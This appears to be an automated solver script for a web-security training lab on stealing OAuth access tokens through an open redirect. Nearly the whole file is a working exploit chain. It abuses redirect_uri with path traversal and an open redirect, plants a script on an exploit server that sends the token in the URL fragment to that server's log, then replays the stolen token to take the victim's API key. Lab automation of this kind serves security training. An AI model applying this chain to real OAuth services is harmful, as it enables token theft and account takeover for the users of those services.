const { getExploitServerUrl, isSolved, readExploitLog, runLab, storeExploit } = require('./_common.cjs');

const TITLE = 'Stealing OAuth access tokens via an open redirect';
const PATH = '/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect';

async function waitForAccessToken(page, exploitUrl) {
  for (let attempt = 0; attempt < 20; attempt += 1) {
    const log = await readExploitLog(page, exploitUrl);
    const match = log.match(/[?&]access_token=([^&\s]+)/);
    if (match) {
      return decodeURIComponent(match[1]);
    }
    await page.waitForTimeout(3000);
  }
  throw new Error('Access token not found in exploit log');
}

async function getSocialLoginAuthUrl(page, labUrl) {
  await page.goto(labUrl + '/social-login', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const html = await page.content();
  const match = html.match(/<meta[^>]+http-equiv=['"]?refresh['"]?[^>]+content=['"]?\d+;url=([^'">\s]+)['"]?/i);
  if (!match) {
    throw new Error('OAuth auth URL not found in social-login page');
  }
  return new URL(match[1].replace(/&amp;/g, '&'));
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    if (await isSolved(page, labUrl)) {
      return;
    }

    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const exploitOrigin = exploitUrl.replace(/\/$/, '');
    const authUrl = await getSocialLoginAuthUrl(page, labUrl);
    const oauthOrigin = authUrl.origin;

    authUrl.searchParams.set(
      'redirect_uri',
      `${labUrl}/oauth-callback/../post/next?path=${encodeURIComponent(`${exploitOrigin}/exploit`)}`,
    );

    const exploitBody = `<script>
if (location.hash) {
  location = '/log?' + location.hash.slice(1);
} else {
  location = '${authUrl.href.replace(/'/g, '%27')}';
}
</script>`;
    await storeExploit(page, exploitUrl, exploitBody, true);

    const accessToken = await waitForAccessToken(page, exploitUrl);
    const response = await page.request.get(oauthOrigin + '/me', {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const profile = await response.json();

    const apiKey = profile.apiKey || profile.api_key || profile.apikey;
    if (!apiKey) {
      throw new Error('API key not found in OAuth profile response');
    }

    await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.evaluate(async (answer) => {
      await fetch('/submitSolution', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'answer=' + encodeURIComponent(answer),
      });
    }, apiKey);
    await page.waitForTimeout(1500);
  },
});
